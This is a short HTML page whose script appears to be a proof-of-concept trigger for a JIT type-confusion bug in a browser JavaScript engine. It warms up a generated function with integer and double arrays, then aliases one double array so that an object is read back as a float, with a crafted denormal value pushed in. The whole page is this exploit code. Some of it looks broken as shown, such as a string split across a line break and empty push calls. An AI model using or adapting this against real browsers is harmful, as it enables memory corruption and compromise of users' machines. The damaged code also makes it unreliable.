<!doctype html>
<meta charset="utf-8">
<script>
const N_BLOCKS = 650;
const LOOP_OPS = 430;
const lines = ["function trigger(x, v2, v3, obj, limit) {"];
for (let i = 0; i < N_BLOCKS; i++) lines.push();
lines.push("  let v4 = v3[0];");
lines.push("  let v5 = v2[0];");
lines.push("  v2[0] = obj;");
lines.push("  let i = 0;");
lines.push("  let res = 0;");
lines.push("  while (i < limit) {");
for (let i = 0; i < LOOP_OPS; i++) lines.push();
lines.push("    res = v3[0] + 0.0;");
lines.push("    Array.prototype.push.call(v3, 4.950618252845e-311);");
lines.push("    i++;");
lines.push("  }");
lines.push("  return res + v4 + v5;");
lines.push("}");
lines.push("return trigger;");
const trigger = new Function(lines.join("
"))();

const obj = {marker: 0x1337};
function makeSmi(poison) { const a = [1, 2, 3]; if (poison) a.sinkhole = 1; return a; }
function makeDouble(poison) { const a = [1.1, 2.2, 3.3]; if (poison) a.sinkhole = 1; return a; }
makeSmi(true);
makeDouble(true);

for (let i = 0; i < 12000; i++) {
  trigger(1000, makeSmi(false), makeSmi(false), obj, 1);
  trigger(1000, makeDouble(false), makeDouble(false), obj, 1);
}
console.log("warmup complete");
setTimeout(() => {
  const victim = makeDouble(false);
  try {
    const result = trigger(1000, victim, victim, obj, 1);
    console.log("victim array elements:");
    for (let i = 0; i < 5; i++) {
      console.log("victim[" + i + "] = " + victim[i] + " (type: " + typeof victim[i] + ")");
    }
  } catch (e) { console.log("caught", e && e.name, String(e)); }
}, 2000);
</script>
